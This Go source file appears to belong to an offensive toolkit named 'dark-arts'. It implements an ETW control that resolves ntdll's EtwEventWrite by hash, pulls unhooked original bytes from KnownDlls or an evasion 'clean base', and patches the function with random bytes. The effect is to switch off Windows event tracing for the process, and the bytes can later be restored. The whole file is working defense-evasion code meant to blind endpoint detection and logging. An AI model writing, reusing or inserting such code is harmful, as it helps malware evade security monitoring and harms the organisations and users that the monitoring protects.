//go:build windows && amd64

package securityctl

import (
	"fmt"

	"dark-arts/pkg/evasion"
)

type ETWControl struct {
	baseControl
	fp *funcPatch
}

func NewETWControl() *ETWControl {
	return &ETWControl{baseControl: newBaseControl("etw")}
}

func (e *ETWControl) Initialize() error {
	// Primary: resolve from the already-loaded ntdll.dll module.
	// LoadLibraryW returns the handle of the already-loaded module,
	// so the address is in the actual code page used by the process.
	fp, err := resolveFuncByHash("ntdll.dll", "EtwEventWrite")
	if err != nil {
		return e.markInitialized(fmt.Errorf("securityctl: etw: resolve: %w", err))
	}

	// Fallback: use KnownDll mapping to read clean on-disk original bytes
	// if the loaded module's bytes appear hooked (non-standard prologue).
	knownDllFP, kerr := resolveFuncFromKnownDlls("ntdll.dll", "EtwEventWrite")
	if kerr == nil && knownDllFP != nil {
		fp.orig = knownDllFP.orig
	}

	// Also try the evasion clean-base for original bytes.
	cleanBase, cerr := evasion.DiagCleanBase()
	if cerr == nil && cleanBase != 0 {
		cleanFP, err := resolveFuncFromBase(cleanBase, "EtwEventWrite")
		if err == nil && cleanFP != nil {
			fp.orig = cleanFP.orig
		}
	}

	e.fp = fp
	return e.markInitialized(nil)
}

func (e *ETWControl) Enable() error {
	if err := e.markEnabled(); err != nil {
		return err
	}
	if e.fp == nil {
		return fmt.Errorf("securityctl: etw: not initialized")
	}
	e.fp.patch = randomPatchBytes()
	if err := applyPatch(e.fp); err != nil {
		e.markDisabled()
		return err
	}
	return nil
}

func (e *ETWControl) Disable() error {
	e.markDisabled()
	if e.fp == nil {
		return nil
	}
	return restorePatch(e.fp)
}

func (e *ETWControl) Restore() {
	if e.fp == nil {
		return
	}
	_ = restorePatch(e.fp)
}
